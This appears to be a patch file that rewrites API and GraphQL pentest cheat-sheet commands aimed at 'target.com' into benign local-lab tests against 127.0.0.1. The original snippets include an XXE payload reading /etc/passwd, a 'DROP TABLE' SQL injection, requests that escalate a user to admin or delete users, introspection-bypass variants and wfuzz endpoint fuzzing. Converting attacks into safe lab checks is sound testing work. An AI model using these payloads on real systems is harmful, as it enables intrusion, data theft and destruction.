curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-lab-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-field-policy-001" --data '{"query":"query PublicProfile($id:ID!){user(id:$id){id displayName}}","variables":{"id":"user-peer"}}' | jq -e '.data or .errors'

curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-lab-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-suggestion-001" --data '{"query":"query InvalidField{viewer{displayNmae}}"}' | jq -e '.errors and (.data == null or .data.viewer == null)'
RETIRE graphql-injection destructive mutation and invalid directive sequence

curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-lab-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-introspection-boundary-001" --data '{"query":"query SchemaExposure{__schema{queryType{name}}}"}' | jq -e '.data.__schema.queryType.name or .errors'

curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-reviewer-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-type-map-001" --data '{"query":"query TypeMap{__schema{types{name kind}}}"}' | jq -e '.data.__schema.types or .errors'

patches.expectedCommand:
# GraphQL Voyager - 可视化分析
# https://github.com/APIs-guru/graphql-voyager

# 使用CLI工具
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL扫描
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
patches.command: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/graphql" -H "Authorization: Bearer graphql-reviewer-token" -H "Content-Type: application/json" -H "X-Request-ID: graphql-schema-export-001" --data '{"query":"query SchemaExport{__schema{queryType{name} mutationType{name}}}"}' | jq -S '.' > graphql-schema-lab.json

patches.expectedCommand:
# 某些实现只检查特定字符串

query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# 使用GET请求
curl "http://target.com/graphql?query={__schema{types{name}}}"
patches.command: RETIRE graphql-introspection restriction-bypass formatting variants

/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
patches.command: newman run api-security-lab.postman_collection.json -e api-security-lab.postman_environment.json --env-var "base_url=http://127.0.0.1:18080" --iteration-count 1 --timeout-request 5000 --reporters cli,json --reporter-json-export api-security-lab-results.json

patches.expectedCommand:
# 测试未授权访问
curl http://target.com/api/v1/users

# 测试JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# 测试API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# 测试Basic Auth
curl -u user:pass http://target.com/api/v1/users
patches.command: for token in none lab-user-token; do if [ "$token" = none ]; then auth=(); else auth=(-H "Authorization: Bearer $token"); fi; curl --silent --show-error --max-time 5 -o /dev/null -w "$token %{http_code}\n" "http://127.0.0.1:18080/api/lab/profile" -H "X-Request-ID: rest-auth-001-$token" "${auth[@]}"; done

patches.expectedCommand:
# 测试允许的HTTP方法
curl -X OPTIONS http://target.com/api/v1/users -v

# 尝试PUT修改
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# 尝试DELETE删除
curl -X DELETE http://target.com/api/v1/users/1

# 尝试PATCH部分更新
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
patches.command: curl --silent --show-error --max-time 5 -X OPTIONS "http://127.0.0.1:18080/api/lab/profile" -H "Authorization: Bearer lab-user-token" -H "Origin: http://127.0.0.1:18080" -H "X-Request-ID: rest-method-001" -D - -o /dev/null

patches.expectedCommand:
# 参数污染测试
# 重复参数
/api/users?id=1&id=2
/api/users?name=admin&name=user

# 数组参数
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON注入
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; DROP TABLE users--
patches.command: curl --fail-with-body --silent --show-error --max-time 5 "http://127.0.0.1:18080/api/lab/parser?marker=FIRST_CANARY&marker=SECOND_CANARY" -H "Authorization: Bearer lab-token" -H "X-Request-ID: rest-duplicate-001" | jq -e '.raw_values and .parsed_value'

patches.expectedCommand:
# 测试不同Content-Type
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML外部实体
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
patches.command: for type in application/json application/x-www-form-urlencoded; do if [ "$type" = application/json ]; then body='{"marker":"CONTENT_TYPE_CANARY_A1"}'; else body='marker=CONTENT_TYPE_CANARY_A1'; fi; curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/content-type/evaluate" -H "Authorization: Bearer lab-token" -H "Content-Type: $type" -H "X-Request-ID: rest-content-type-001" --data "$body" | jq -c '{content_type,marker,rejected}'; done

patches.expectedCommand:
# 尝试不同API版本
/api/v1/users  # 可能已修复
/api/v2/users  # 可能未修复
/api/users     # 旧版本可能无保护

# 尝试内部API
/internal/api/users
/private/api/users
/_api/users
patches.command: for version in v1 v2; do curl --silent --show-error --max-time 5 -o /dev/null -w "$version %{http_code}\n" "http://127.0.0.1:18080/api/$version/lab/profile" -H "Authorization: Bearer lab-user-token" -H "X-Request-ID: rest-version-001-$version"; done

patches.expectedCommand:
# URL编码
curl http://target.com/api/users/%31  # /users/1

# Unicode编码
curl http://target.com/api/users/%u0031

# 双重URL编码
curl http://target.com/api/users/%2531
patches.command: for path in user-1 user-%31; do curl --silent --show-error --max-time 5 -o /dev/null -w "$path %{http_code}\n" "http://127.0.0.1:18080/api/lab/canonical-users/$path" -H "Authorization: Bearer lab-user-token" -H "X-Request-ID: rest-canonical-001"; done
